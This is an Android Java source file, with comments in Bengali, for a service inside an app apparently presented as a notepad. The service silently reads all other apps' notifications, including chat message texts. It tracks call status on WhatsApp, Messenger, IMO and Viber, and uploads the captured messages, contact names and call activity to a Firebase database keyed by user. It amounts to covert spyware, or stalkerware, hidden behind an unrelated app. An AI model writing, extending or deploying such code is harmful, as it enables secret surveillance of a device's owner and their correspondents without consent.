package com.megh.notepad; // আপনার প্যাকেজের সঠিক নাম দিন

import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class NotificationReaderService extends NotificationListenerService {

    // 🌟 ডুপ্লিকেট মেসেজ ঠেকানোর জন্য ভেরিয়েবল 🌟
    private static String lastSavedTitle = "";
    private static String lastSavedText = "";
    private static long lastSavedTime = 0;

    // ডাইনামিক ইউজারনেম
    private String getUserName() {
        SharedPreferences prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE);
        return prefs.getString("UserName", "UnknownUser");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null || sbn.getNotification().extras == null) return;

        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();

        // System বা Android এর নিজস্ব অপ্রয়োজনীয় নোটিফিকেশনগুলো বাদ দেওয়া
        if (packageName.equals(getPackageName()) || packageName.equals("android") || packageName.equals("com.android.systemui")) {
            return;
        }

        try {
            Bundle extras = notification.extras;

            CharSequence titleChars = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence textChars = extras.getCharSequence(Notification.EXTRA_TEXT);

            String title = titleChars != null ? titleChars.toString() : "";
            String text = textChars != null ? textChars.toString() : "";

            // একাধিক মেসেজ (গ্রুপ নোটিফিকেশন) একসাথে পড়ার লজিক
            CharSequence[] lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
            if (lines != null && lines.length > 0) {
                StringBuilder multiLineText = new StringBuilder();
                for (CharSequence line : lines) {
                    multiLineText.append(line.toString()).append("\n");
                }
                text = multiLineText.toString().trim();
            }

            if (title.isEmpty() && text.isEmpty()) return;

            // 🌟 ফিক্স: ডুপ্লিকেট মেসেজ চেকিং লজিক (১.৫ সেকেন্ডের মধ্যে একই মেসেজ আসলে ইগনোর করবে) 🌟
            long currentTime = System.currentTimeMillis();
            if (title.equals(lastSavedTitle) && text.equals(lastSavedText) && (currentTime - lastSavedTime) < 1500) {
                Log.d("NotificationReader", "Duplicate message ignored.");
                return; // ডুপ্লিকেট হলে এখান থেকেই ফিরে যাবে
            }
            
            // নতুন মেসেজ হলে মেমোরিতে সেভ করে রাখা
            lastSavedTitle = title;
            lastSavedText = text;
            lastSavedTime = currentTime;

            String tTitle = title.toLowerCase();
            String tText = text.toLowerCase();

            // ==========================================
            // পার্ট ১: কল ট্র্যাকিং লজিক
            // ==========================================
            if (packageName.contains("whatsapp") || packageName.contains("messenger") || 
                packageName.contains("imo") || packageName.contains("viber")) {
                
                String appNameForCall = "Unknown App";
                if (packageName.contains("whatsapp")) appNameForCall = "WhatsApp";
                else if (packageName.contains("messenger")) appNameForCall = "Messenger";
                else if (packageName.contains("imo")) appNameForCall = "IMO";
                else if (packageName.contains("viber")) appNameForCall = "Viber";

                // ১. চেক করবো এটি 'Missed call' কিনা
                if (tTitle.contains("missed") || tText.contains("missed")) {
                    String personName = title; 
                    if (tTitle.contains("missed")) personName = text; 
                    updateCallFirebase("Missed Call", personName, appNameForCall);
                    return; 
                }
                // ২. রিংগিং বা কথা বলা (Speaking)
                else if (tText.contains("call") || tTitle.contains("call") || 
                    tText.contains("ongoing") || tTitle.contains("ongoing") ||
                    tText.contains("ringing") || tTitle.contains("ringing")) {
                    
                    String personName = title; 
                    if (tTitle.contains("call") || tTitle.contains("ongoing") || tTitle.contains("ringing")) {
                        personName = text; 
                    }
                    
                    String status = "Speaking (Internet Call)";
                    if (tText.contains("ringing") || tTitle.contains("ringing") || tText.contains("incoming")) {
                        status = "Ringing (Incoming)";
                    }

                    updateCallFirebase(status, personName, appNameForCall);
                    return; 
                }
            }

            // ==========================================
            // পার্ট ২: সাধারণ মেসেজ/নোটিফিকেশন ট্র্যাকিং লজিক
            // ==========================================
            if (!tText.contains("call") && !tTitle.contains("call") && 
                !tText.contains("ongoing") && !tTitle.contains("ongoing") &&
                !tText.contains("ringing") && !tTitle.contains("ringing")) {
                
                String appName = getAppNameFromPkgName(packageName);
                long timestamp = sbn.getPostTime();
                
                sendToFirebaseAsMessage(appName, packageName, title, text, timestamp);
            }

        } catch (Exception e) {
            Log.e("NotificationReader", "Error reading notification: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null || sbn.getNotification().extras == null) return;
        
        String packageName = sbn.getPackageName();
        if (packageName.contains("whatsapp") || packageName.contains("messenger") || packageName.contains("imo") || packageName.contains("viber")) {
            
            CharSequence titleChars = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence textChars = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);

            String title = titleChars != null ? titleChars.toString().toLowerCase() : "";
            String text = textChars != null ? textChars.toString().toLowerCase() : "";

            if (text.contains("call") || title.contains("call") || 
                text.contains("ongoing") || title.contains("ongoing") ||
                text.contains("ringing") || title.contains("ringing")) {
                
                updateCallFirebase("No Active Call", "N/A", "N/A");
            }
        }
    }

    // কল ডাটা ফায়ারবেসে পাঠানোর মেথড
    private void updateCallFirebase(String status, String talkingWith, String appName) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(getUserName()).child("ActiveCall");

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault());
            String time = sdf.format(new Date());

            Map<String, Object> data = new HashMap<>();
            data.put("Call_Status", status);
            data.put("Talking_With", talkingWith);
            data.put("App_Name", appName);
            data.put("Last_Updated", time);

            dbRef.setValue(data);
        } catch (Exception e) {}
    }

    // সাধারণ মেসেজ ফায়ারবেসে পাঠানোর মেথড
    private void sendToFirebaseAsMessage(String appName, String packageName, String title, String text, long timestamp) {
        try {
            String safeAppName = appName.replace(".", "_").replace("#", "").replace("$", "").replace("[", "").replace("]", "");
            
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(getUserName()).child("Notifications").child(safeAppName);

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
            String timeString = sdf.format(new Date(timestamp));

            String uniqueKey = "Time_" + timestamp + "_ID_" + System.currentTimeMillis();

            Map<String, Object> notifData = new HashMap<>();
            notifData.put("App_Name", safeAppName);
            notifData.put("Package", packageName);
            notifData.put("Title", title);
            notifData.put("Message", text);
            notifData.put("Time", timeString);
            notifData.put("Timestamp", timestamp); 

            dbRef.child(uniqueKey).setValue(notifData);
            Log.d("NotificationReader", "Message Saved: " + safeAppName + " -> " + title);
        } catch (Exception e) {
            Log.e("NotificationReader", "Firebase Error: " + e.getMessage());
        }
    }

    // প্যাকেজ নেম থেকে আসল অ্যাপের নাম বের করার মেথড
    private String getAppNameFromPkgName(String Packagename) {
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            ApplicationInfo appInfo = packageManager.getApplicationInfo(Packagename, 0);
            return (String) packageManager.getApplicationLabel(appInfo);
        } catch (PackageManager.NameNotFoundException e) {
            return Packagename;
        }
    }
}


